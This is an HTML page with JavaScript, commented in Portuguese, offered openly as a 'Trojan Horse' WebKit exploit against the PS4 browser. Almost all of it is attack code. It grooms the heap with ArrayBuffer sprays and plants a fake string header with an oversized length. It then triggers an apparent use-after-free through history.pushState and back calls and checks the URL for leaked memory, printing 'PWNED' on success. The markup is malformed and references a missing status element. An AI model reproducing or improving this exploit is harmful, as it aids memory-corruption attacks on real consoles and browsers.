<!DOCTYPE html>
<html>
<head>

    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }

<body>
<h2>PS4 WebKit - Trojan Horse (64b)</h2>
<div class="build-id">BUILD ID: TROJAN_FINAL_V5 (Verifique isso!)</div>

<button onclick="runTrojanExploit()">INICIAR EXPLOIT</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m) { 
    const d = document.createElement("div");
    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

// === A ARMA DO CRIME ===
function createTrojanObject(size, marker) {
    try {
        let buf = new ArrayBuffer(size);
        let view = new Uint32Array(buf);
        
        // Se for o bucket de 64 bytes (o nosso campeão):
        if (size === 64) {
            // CRIA O FAKE HEADER
            // Isso diz pro WebKit: "Sou uma string de 128.000 caracteres!"
            view[0] = 0x00000016; // Flags
            view[1] = 0x00020000; // Length Gigante
            view[2] = 0x41414141; // Lixo
            view[3] = 0x41414141; // Lixo
            // Enche o resto com 'C' para manter o peso igual ao teste que funcionou
            for(let i=4; i<view.length; i++) view[i] = 0x43434343;
        } else {
            // Outros tamanhos apenas ocupam espaço (Lixo)
            for(let i=0; i<view.length; i++) view[i] = marker;
        }
        return buf;
    } catch(e) { return null; }
}

async function runTrojanExploit() {
    logEl.innerHTML = "";
    keepAlive = [];
    statusEl.innerText = "Preparando...";

    // Buckets idênticos ao teste "CCCC"
    const BUCKETS = [
        { size: 80,  marker: 0x41414141 }, 
        { size: 96,  marker: 0x42424242 }, 
        { size: 64,  marker: 0x43434343 }, // O Alvo
        { size: 128, marker: 0x44444444 }  
    ];

    log("1. Preparando Grooming...");
    for(let b of BUCKETS) {
        for(let k=0; k<100; k++) keepAlive.push(createTrojanObject(b.size, b.marker));
    }
    
    keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);

    // === TRIGGER UAF (Loop 48 - O que funcionou) ===
    log("2. Disparando UAF (Loop 48)...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        if (i === 47) {
            log(">>> INJEÇÃO TROJAN <<<");
            
            setTimeout(() => history.back(), 0);
            
            // Spray Massivo
            for(let k=0; k<300; k++) { // Aumentei um pouco a dose
                for(let b of BUCKETS) {
                    keepAlive.push(createTrojanObject(b.size, b.marker));
                }
            }
            
            setTimeout(() => forceGC(), 20); 
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(500);
    checkResult();
}

function forceGC() {
    for (let i = 0; i < 4; i++) new ArrayBuffer(8 * 1024 * 1024);
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    
    // 1. CHECAGEM DE VITÓRIA (Memory Leak)
    // Se a URL estiver gigante e não for só "V", vencemos.
    if (url.length > 2000 && url.indexOf("VVVV") === -1) {
        log("!!! GOD MODE ATIVADO !!!");
        log(`Tamanho URL: ${url.length}`);
        
        let dump = "";
        for(let i=1000; i<1030; i++) dump += url.charCodeAt(i).toString(16).padStart(2,'0') + " ";
        log(`LEAK: ${dump}`);
        
        statusEl.innerText = "PWNED: MEMORY LEAK";
        statusEl.className = "pwned";
        return;
    }

    // 2. CHECAGEM DE SINAL (Ainda vê CCCC?)
    if (url.indexOf("CCCC") !== -1) {
        log("Sinal: 'CCCC' encontrado.");
        log("O objeto entrou, mas o navegador leu os dados brutos, não o header.");
        log("Isso é quase lá. Tente de novo.");
    } else {
        log("Resultado: Falha ou 'V' persistente.");
    }
}
